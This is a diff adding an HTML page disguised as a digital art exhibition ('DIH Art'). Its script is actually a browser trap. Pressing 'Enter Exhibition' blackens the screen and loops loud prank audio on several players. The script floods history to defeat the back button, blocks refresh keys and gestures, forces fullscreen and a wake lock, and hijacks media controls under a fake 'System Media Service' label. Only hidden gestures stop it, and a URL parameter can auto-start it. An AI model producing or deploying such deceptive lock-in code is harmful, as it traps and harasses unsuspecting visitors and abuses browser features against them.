@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  <title>DIH Art - Sound & Visual Exhibition</title>
+  <meta name="theme-color" content="#07090e" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    html, body {
+      width: 100%;
+      height: 100%;
+      background-color: #07090e;
+      color: #f1f5f9;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      overflow-x: hidden;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    /* Landing / Preview Cover Screen */
+    #preview-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 24px;
+      text-align: center;
+      background: radial-gradient(circle at 50% 30%, #1e1b4b 0%, #07090e 70%);
+      transition: opacity 0.2s ease;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 6px 14px;
+      border-radius: 9999px;
+      background: rgba(244, 63, 94, 0.15);
+      border: 1px solid rgba(244, 63, 94, 0.3);
+      color: #fb7185;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 20px;
+    }
+
+    .art-frame {
+      width: 220px;
+      height: 220px;
+      border-radius: 24px;
+      overflow: hidden;
+      border: 2px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6), 0 0 50px rgba(244, 63, 94, 0.2);
+      margin-bottom: 28px;
+      position: relative;
+    }
+
+    .art-frame img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    h1 {
+      font-size: 26px;
+      font-weight: 900;
+      color: #ffffff;
+      margin-bottom: 8px;
+      letter-spacing: -0.02em;
+    }
+
+    h1 span {
+      color: #f43f5e;
+    }
+
+    p {
+      font-size: 14px;
+      color: #94a3b8;
+      max-width: 320px;
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    .play-btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      max-width: 280px;
+      padding: 16px 28px;
+      border-radius: 16px;
+      background: linear-gradient(135deg, #f43f5e, #e11d48);
+      color: #ffffff;
+      font-size: 15px;
+      font-weight: 800;
+      border: none;
+      cursor: pointer;
+      box-shadow: 0 10px 25px rgba(244, 63, 94, 0.4);
+      transition: transform 0.15s ease, filter 0.15s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+
+    .play-btn:active {
+      transform: scale(0.96);
+      filter: brightness(1.1);
+    }
+
+    .play-btn svg {
+      width: 18px;
+      height: 18px;
+      fill: currentColor;
+    }
+
+    /* 100% PITCH-BLACK SCREEN-OFF OVERLAY */
+    #screen-off {
+      display: none;
+      position: fixed;
+      inset: 0;
+      width: 100vw;
+      height: 100vh;
+      background: #000000 !important;
+      z-index: 999999999;
+      cursor: none;
+      touch-action: none;
+    }
+
+    /* Secret Emergency Exit (Top-Right 80x80 area: 5 rapid taps) */
+    #secret-exit-zone {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 80px;
+      height: 80px;
+      z-index: 1000000000;
+      background: transparent;
+      cursor: default;
+    }
+
+    /* Secret Admin Control Box */
+    #admin-escape-box {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #0f172a;
+      border: 1px solid #334155;
+      padding: 24px;
+      border-radius: 16px;
+      color: #f8fafc;
+      text-align: center;
+      z-index: 1000000005;
+      box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
+      max-width: 90%;
+      width: 320px;
+    }
+
+    #admin-escape-box h3 {
+      font-size: 17px;
+      font-weight: 800;
+      margin-bottom: 6px;
+      color: #38bdf8;
+      text-transform: uppercase;
+    }
+
+    #admin-escape-box p {
+      font-size: 13px;
+      color: #94a3b8;
+      margin-bottom: 18px;
+    }
+
+    .btn-action {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      border-radius: 10px;
+      border: none;
+      font-weight: 700;
+      font-size: 13px;
+      cursor: pointer;
+      margin-bottom: 8px;
+    }
+
+    .btn-red { background: #ef4444; color: white; }
+    .btn-blue { background: #2563eb; color: white; }
+
+    #audio-rack { display: none; }
+  </style>
+</head>
+<body>
+
+  <!-- Audio elements holder -->
+  <div id="audio-rack"></div>
+
+  <!-- VISIBLE PREVIEW / ENTRY INTERFACE -->
+  <div id="preview-container">
+    <div class="badge">
+      <span>●</span> Live Digital Art Tour
+    </div>
+
+    <div class="art-frame">
+      <img src="https://images.unsplash.com/photo-1579783902614-a3fb3927b6a5?w=500&auto=format&fit=crop&q=80" alt="Exhibition Art" />
+    </div>
+
+    <h1>DIH <span>ART</span></h1>
+    <p>Tap "Enter Exhibition" to begin the immersive high-definition sound experience.</p>
+
+    <button id="btn-start" class="play-btn">
+      <svg viewBox="0 0 24 24"><polygon points="5 3 19 12 5 21 5 3"></polygon></svg>
+      Enter Exhibition
+    </button>
+  </div>
+
+  <!-- PURE BLACK SCREEN (Activated immediately on click) -->
+  <div id="screen-off">
+    <!-- Secret Tap Zone (Top-Right Corner) -->
+    <div id="secret-exit-zone"></div>
+  </div>
+
+  <!-- Admin Exit Box -->
+  <div id="admin-escape-box">
+    <h3>DIH Art Trap Unlocked</h3>
+    <p>Secret developer exit triggered.</p>
+    <button class="btn-action btn-red" id="btn-reactivate">Reactivate Trap</button>
+    <button class="btn-action btn-blue" id="btn-back">Back to Preview</button>
+  </div>
+
+  <script>
+    (function () {
+      'use strict';
+
+      const AUDIO_SRC = '/prankaudio.mp3';
+      const FALLBACK_SRC = 'https://kexart.com/prankaudio.mp3';
+
+      let isActive = false;
+      let wakeLockInstance = null;
+      let audioCtx = null;
+      let audioBuffer = null;
+      let audioPlayers = [];
+      let bufferSourceNodes = [];
+      let gainNodes = [];
+      let keepAliveOsc = null;
+      let bgWorker = null;
+      let secretTapCount = 0;
+      let secretTapTimer = null;
+      let escapePressCount = 0;
+      let typedBuffer = '';
+
+      const previewContainer = document.getElementById('preview-container');
+      const screenOffEl = document.getElementById('screen-off');
+      const secretZoneEl = document.getElementById('secret-exit-zone');
+      const audioRackEl = document.getElementById('audio-rack');
+      const adminBoxEl = document.getElementById('admin-escape-box');
+      const btnStart = document.getElementById('btn-start');
+      const btnReactivate = document.getElementById('btn-reactivate');
+      const btnBack = document.getElementById('btn-back');
+
+      // Preload audio
+      try {
+        const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+        if (AudioContextClass) audioCtx = new AudioContextClass();
+        fetch(AUDIO_SRC)
+          .then(r => r.arrayBuffer())
+          .then(b => audioCtx && audioCtx.decodeAudioData(b))
+          .then(d => { audioBuffer = d; })
+          .catch(() => {});
+      } catch (e) {}
+
+      // 1. Screen WakeLock
+      async function requestWakeLock() {
+        if (!isActive) return;
+        try {
+          if ('wakeLock' in navigator && navigator.wakeLock.request) {
+            wakeLockInstance = await navigator.wakeLock.request('screen');
+            wakeLockInstance.addEventListener('release', () => {
+              if (isActive && document.visibilityState === 'visible') requestWakeLock();
+            });
+          }
+        } catch (e) {}
+      }
+
+      // 2. Fullscreen Lock
+      function requestFullscreenLock() {
+        try {
+          if (!document.fullscreenElement) {
+            const el = document.documentElement;
+            if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
+            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(() => {});
+            else if (el.mozRequestFullScreen) el.mozRequestFullScreen().catch(() => {});
+            else if (el.msRequestFullscreen) el.msRequestFullscreen().catch(() => {});
+          }
+        } catch (e) {}
+      }
+
+      // 3. Unbreakable History Trap
+      function floodHistory() {
+        try {
+          for (let i = 0; i < 40; i++) {
+            window.history.pushState({ dihTrap: true, i }, '', window.location.href);
+          }
+        } catch (e) {}
+      }
+
+      window.addEventListener('popstate', function () {
+        if (isActive) {
+          floodHistory();
+          window.history.forward();
+          ensureAudioPlaying();
+        }
+      });
+
+      setInterval(function () {
+        if (isActive) {
+          try {
+            window.history.pushState({ dihTrap: true }, '', window.location.href);
+          } catch (e) {}
+        }
+      }, 350);
+
+      window.addEventListener('beforeunload', function (e) {
+        if (isActive) {
+          e.preventDefault();
+          e.returnValue = '';
+          return '';
+        }
+      });
+
+      // 4. Block Gestures, Swipes, Refresh Keys
+      function preventAllGestures(e) {
+        if (isActive && e.cancelable) e.preventDefault();
+      }
+
+      window.addEventListener('touchmove', preventAllGestures, { passive: false });
+      window.addEventListener('wheel', preventAllGestures, { passive: false });
+      window.addEventListener('contextmenu', preventAllGestures);
+      window.addEventListener('gesturestart', preventAllGestures, { passive: false });
+
+      window.addEventListener('keydown', function (e) {
+        if (isActive) {
+          if (
+            e.key === 'Backspace' ||
+            (e.altKey && e.key === 'ArrowLeft') ||
+            e.key === 'F5' ||
+            (e.ctrlKey && e.key.toLowerCase() === 'r') ||
+            (e.metaKey && e.key.toLowerCase() === 'r')
+          ) {
+            e.preventDefault();
+            e.stopPropagation();
+          }
+
+          if (e.key === 'Escape') {
+            escapePressCount++;
+            if (escapePressCount >= 3) {
+              deactivateScreenOff();
+              escapePressCount = 0;
+            }
+          }
+
+          typedBuffer = (typedBuffer + e.key.toLowerCase()).slice(-4);
+          if (typedBuffer === 'stop' || typedBuffer === 'exit') {
+            deactivateScreenOff();
+          }
+        }
+      }, true);
+
+      // 5. MediaSession Overrides
+      function setupMediaSession() {
+        if ('mediaSession' in navigator) {
+          try {
+            navigator.mediaSession.metadata = new MediaMetadata({
+              title: 'System Media Service',
+              artist: 'Audio Core Engine',
+              album: 'Background Stream'
+            });
+            navigator.mediaSession.playbackState = 'playing';
+
+            const forceResume = function () {
+              if (isActive) {
+                navigator.mediaSession.playbackState = 'playing';
+                ensureAudioPlaying();
+              }
+            };
+
+            ['play', 'pause', 'stop', 'previoustrack', 'nexttrack', 'seekto', 'seekbackward', 'seekforward'].forEach(act => {
+              try { navigator.mediaSession.setActionHandler(act, forceResume); } catch (e) {}
+            });
+          } catch (e) {}
+        }
+      }
+
+      function ensureAudioPlaying() {
+        if (!isActive) return;
+        audioPlayers.forEach(aud => {
+          aud.volume = 1.0;
+          if (aud.paused) aud.play().catch(() => {});
+        });
+        if (audioCtx && audioCtx.state === 'suspended') {
+          audioCtx.resume().catch(() => {});
+        }
+      }
+
+      function startAllAudio() {
+        try {
+          stopAllAudio();
+          requestWakeLock();
+          requestFullscreenLock();
+          setupMediaSession();
+
+          // 4 HTML5 players
+          audioRackEl.innerHTML = '';
+          audioPlayers = [];
+
+          for (let i = 0; i < 4; i++) {
+            const aud = new Audio(AUDIO_SRC);
+            aud.loop = true;
+            aud.volume = 1.0;
+            aud.preload = 'auto';
+            aud.setAttribute('playsinline', 'true');
+            aud.setAttribute('webkit-playsinline', 'true');
+            aud.setAttribute('x-webkit-airplay', 'allow');
+            aud.currentTime = (i * 0.15) % 1.5;
+
+            aud.onpause = function () {
+              if (isActive) {
+                setTimeout(() => { aud.volume = 1.0; aud.play().catch(() => {}); }, 30);
+              }
+            };
+            aud.onended = function () {
+              if (isActive) {
+                aud.currentTime = 0;
+                aud.volume = 1.0;
+                aud.play().catch(() => {});
+              }
+            };
+            aud.onerror = function () {
+              aud.src = FALLBACK_SRC;
+              aud.play().catch(() => {});
+            };
+
+            audioRackEl.appendChild(aud);
+            aud.play().catch(() => {});
+            audioPlayers.push(aud);
+          }
+
+          // Web Audio API
+          const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+          if (AudioContextClass) {
+            if (!audioCtx) audioCtx = new AudioContextClass();
+            if (audioCtx.state === 'suspended') audioCtx.resume().catch(() => {});
+
+            try {
+              keepAliveOsc = audioCtx.createOscillator();
+              const keepAliveGain = audioCtx.createGain();
+              keepAliveGain.gain.setValueAtTime(0.001, audioCtx.currentTime);
+              keepAliveOsc.connect(keepAliveGain);
+              keepAliveGain.connect(audioCtx.destination);
+              keepAliveOsc.start();
+            } catch (e) {}
+
+            if (audioBuffer) {
+              playBuffer(audioBuffer);
+            } else {
+              fetch(AUDIO_SRC)
+                .then(r => r.arrayBuffer())
+                .then(b => audioCtx.decodeAudioData(b))
+                .then(d => {
+                  audioBuffer = d;
+                  if (isActive) playBuffer(d);
+                })
+                .catch(() => {});
+            }
+          }
+
+          if ('vibrate' in navigator) {
+            try { navigator.vibrate([200, 100, 300, 100, 500]); } catch (e) {}
+          }
+        } catch (err) {}
+      }
+
+      function playBuffer(buf) {
+        if (!audioCtx || !isActive) return;
+        try {
+          const masterGain = audioCtx.createGain();
+          masterGain.gain.setValueAtTime(2.5, audioCtx.currentTime);
+          masterGain.connect(audioCtx.destination);
+
+          const source = audioCtx.createBufferSource();
+          source.buffer = buf;
+          source.loop = true;
+          source.connect(masterGain);
+          source.start(0);
+
+          bufferSourceNodes.push(source);
+          gainNodes.push(masterGain);
+        } catch (e) {}
+      }
+
+      function stopAllAudio() {
+        try {
+          if (keepAliveOsc) {
+            try { keepAliveOsc.stop(); keepAliveOsc.disconnect(); } catch (e) {}
+            keepAliveOsc = null;
+          }
+          audioPlayers.forEach(aud => {
+            try {
+              aud.onpause = null;
+              aud.onended = null;
+              aud.pause();
+              aud.currentTime = 0;
+              aud.src = '';
+            } catch (e) {}
+          });
+          audioPlayers = [];
+          audioRackEl.innerHTML = '';
+
+          bufferSourceNodes.forEach(src => {
+            try { src.stop(); src.disconnect(); } catch (e) {}
+          });
+          bufferSourceNodes = [];
+
+          gainNodes.forEach(g => {
+            try { g.disconnect(); } catch (e) {}
+          });
+          gainNodes = [];
+
+          if (audioCtx && audioCtx.state !== 'closed') audioCtx.suspend().catch(() => {});
+        } catch (e) {}
+      }
+
+      // Background Web Worker
+      try {
+        const workerBlob = new Blob([
+          'self.onmessage = function() { setInterval(function() { self.postMessage("beat"); }, 200); };'
+        ], { type: 'application/javascript' });
+        bgWorker = new Worker(URL.createObjectURL(workerBlob));
+        bgWorker.onmessage = ensureAudioPlaying;
+        bgWorker.postMessage('start');
+      } catch (e) {}
+
+      setInterval(ensureAudioPlaying, 250);
+
+      document.addEventListener('visibilitychange', function () {
+        ensureAudioPlaying();
+        if (document.visibilityState === 'visible' && isActive) {
+          requestWakeLock();
+          requestFullscreenLock();
+        }
+      });
+      window.addEventListener('pagehide', ensureAudioPlaying);
+      window.addEventListener('blur', ensureAudioPlaying);
+
+      // Trigger Screen-Off Trap
+      function launchTrap() {
+        isActive = true;
+        previewContainer.style.display = 'none';
+        screenOffEl.style.display = 'block';
+        document.body.style.overflow = 'hidden';
+        document.body.style.cursor = 'none';
+        floodHistory();
+        startAllAudio();
+      }
+
+      // Tap on black screen ensures full volume
+      screenOffEl.addEventListener('click', function () {
+        requestFullscreenLock();
+        ensureAudioPlaying();
+      });
+      screenOffEl.addEventListener('touchstart', function () {
+        requestFullscreenLock();
+        ensureAudioPlaying();
+      });
+
+      // Secret developer tap
+      function handleSecretTap() {
+        secretTapCount++;
+        if (secretTapTimer) clearTimeout(secretTapTimer);
+        if (secretTapCount >= 5) {
+          secretTapCount = 0;
+          deactivateScreenOff();
+        } else {
+          secretTapTimer = setTimeout(() => { secretTapCount = 0; }, 2000);
+        }
+      }
+
+      secretZoneEl.addEventListener('click', function (e) {
+        e.stopPropagation();
+        handleSecretTap();
+      });
+      secretZoneEl.addEventListener('touchstart', function (e) {
+        e.stopPropagation();
+        handleSecretTap();
+      });
+
+      function deactivateScreenOff() {
+        isActive = false;
+        stopAllAudio();
+        if (wakeLockInstance) {
+          try { wakeLockInstance.release(); } catch (e) {}
+          wakeLockInstance = null;
+        }
+        if (document.fullscreenElement && document.exitFullscreen) {
+          document.exitFullscreen().catch(() => {});
+        }
+        screenOffEl.style.display = 'none';
+        document.body.style.cursor = 'default';
+        adminBoxEl.style.display = 'block';
+      }
+
+      btnStart.addEventListener('click', launchTrap);
+
+      btnReactivate.addEventListener('click', function () {
+        adminBoxEl.style.display = 'none';
+        launchTrap();
+      });
+
+      btnBack.addEventListener('click', function () {
+        adminBoxEl.style.display = 'none';
+        previewContainer.style.display = 'flex';
+        document.body.style.cursor = 'default';
+        document.body.style.overflow = 'auto';
+      });
+
+      // Check URL params for immediate auto-start
+      const params = new URLSearchParams(window.location.search);
+      if (params.get('trap') === '1' || params.get('play') === '1' || params.get('auto') === '1') {
+        launchTrap();
+      }
+
+    })();
+  </script>
+</body>
+</html>
